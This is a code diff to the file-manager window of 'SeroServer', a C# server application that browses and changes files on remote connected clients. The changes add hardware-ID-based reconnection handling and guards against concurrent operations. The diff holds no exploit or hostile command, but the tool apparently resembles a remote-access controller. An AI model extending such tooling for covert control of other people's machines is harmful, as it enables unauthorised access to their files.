@@ -13,7 +13,8 @@ namespace SeroServer.UI;
 public partial class FileManagerWindow : ThemedWindow
 {
     private readonly TlsServer _server;
-    private readonly string    _clientId;
+    private          string    _clientId;
+    private readonly string    _hwid;
     private readonly string    _tempPrefix;   // per-client prefix for preview temp files
     private readonly ObservableCollection<FileEntryVM> _entries = [];
     private readonly Stack<string> _history = new();
@@ -36,6 +37,7 @@ public partial class FileManagerWindow : ThemedWindow
         RubberBandSelector.Enable(GridFiles);
         _server     = server;
         _clientId   = clientId;
+        _hwid       = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
         _tempPrefix = "sero_prev_" + string.Concat(clientId.Select(c => char.IsLetterOrDigit(c) ? c : '_')) + "_";
         TxtTitle.Text = clientLabel;
         GridFiles.ItemsSource = _entries;
@@ -85,13 +87,15 @@ public partial class FileManagerWindow : ThemedWindow
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
         _server.ClientDisconnected += OnClientDisconnected;
+        _server.ClientConnected    += OnClientConnected;
         Closed += (_, _) =>
         {
-            _server.UnregisterHandler(clientId, PacketType.FmListResult);
-            _server.UnregisterHandler(clientId, PacketType.FmFileData);
-            _server.UnregisterHandler(clientId, PacketType.FmHashResult);
-            _server.UnregisterHandler(clientId, PacketType.FmAck);
+            _server.UnregisterHandler(_clientId, PacketType.FmListResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmFileData);
+            _server.UnregisterHandler(_clientId, PacketType.FmHashResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmAck);
             _server.ClientDisconnected -= OnClientDisconnected;
+            _server.ClientConnected    -= OnClientConnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
         // MediaOpened fires when WMF has fully opened the file — safe moment to call Play()
@@ -286,6 +290,7 @@ public partial class FileManagerWindow : ThemedWindow
 
     private async void Upload_Click(object s, RoutedEventArgs e)
     {
+        if (_pendingAck != null || _pendingHash != null) return;
         var dlg = new Microsoft.Win32.OpenFileDialog { Multiselect = false };
         if (dlg.ShowDialog() != true) return;
         if (string.IsNullOrEmpty(_currentPath))
@@ -336,6 +341,7 @@ public partial class FileManagerWindow : ThemedWindow
     {
         var selected = GridFiles.SelectedItems.Cast<FileEntryVM>().ToList();
         if (selected.Count == 0) return;
+        if (_pendingAck != null || _pendingHash != null) return;
         var msg = selected.Count == 1
             ? string.Format(Lang.Get("FM_CONFIRM_DELETE_1"), selected[0].Name)
             : string.Format(Lang.Get("FM_CONFIRM_DELETE_N"), selected.Count);
@@ -443,6 +449,7 @@ public partial class FileManagerWindow : ThemedWindow
     private async void Rename_Click(object s, RoutedEventArgs e)
     {
         if (GridFiles.SelectedItem is not FileEntryVM row) return;
+        if (_pendingAck != null || _pendingHash != null) return;
         var newName = PromptInput(string.Format(Lang.Get("FM_RENAME_PROMPT"), row.Name), row.Name);
         if (string.IsNullOrWhiteSpace(newName) || newName == row.Name) return;
         var oldPath = Path.Combine(_currentPath, row.Name);
@@ -484,6 +491,7 @@ public partial class FileManagerWindow : ThemedWindow
 
     private async void NewFolder_Click(object s, RoutedEventArgs e)
     {
+        if (_pendingAck != null || _pendingHash != null) return;
         var name = PromptInput(Lang.Get("FM_NEW_FOLDER_NAME"), Lang.Get("FM_NEW_FOLDER_DEF"));
         if (string.IsNullOrWhiteSpace(name)) return;
         var path = Path.Combine(_currentPath, name);
@@ -554,6 +562,7 @@ public partial class FileManagerWindow : ThemedWindow
     private async void Hash_Click(object s, RoutedEventArgs e)
     {
         if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        if (_pendingAck != null || _pendingHash != null) return;
         var path = Path.Combine(_currentPath, row.Name);
         TxtStatus.Text = Lang.Get("FM_COMPUTING_HASH");
         ServerWindow.ReportGlobalActivity("Compute hash", row.Name, "running");
@@ -624,6 +633,7 @@ public partial class FileManagerWindow : ThemedWindow
     private async void SetAttr_Click(object s, RoutedEventArgs e)
     {
         if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        if (_pendingAck != null || _pendingHash != null) return;
         var path = Path.Combine(_currentPath, row.Name);
         var current = (System.IO.FileAttributes)row.AttributesRaw;
         var newAttrs = ShowAttrDialog(row.Name, current);
@@ -959,6 +969,29 @@ public partial class FileManagerWindow : ThemedWindow
         _pendingPreview?.TrySetCanceled();
         _pendingHash?.TrySetCanceled();
         _pendingAck?.TrySetCanceled();
+    }
+
+    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _server.UnregisterHandler(_clientId, PacketType.FmListResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmFileData);
+            _server.UnregisterHandler(_clientId, PacketType.FmHashResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmAck);
+            _clientId = c.Id;
+            _server.RegisterHandler(_clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
+            _server.RegisterHandler(_clientId, PacketType.FmFileData, pkt =>
+            {
+                var pd = _pendingData;
+                if (pd != null) pd.TrySetResult(pkt.Data);
+                else _pendingPreview?.TrySetResult(pkt.Data);
+            });
+            _server.RegisterHandler(_clientId, PacketType.FmHashResult, pkt => { _pendingHash?.TrySetResult(pkt.Data); });
+            _server.RegisterHandler(_clientId, PacketType.FmAck,        pkt => { _pendingAck?.TrySetResult(pkt.Data); });
+            _ = Navigate(_currentPath);
+        });
     }
 
     // ── Helpers ─────────────────────────────────────
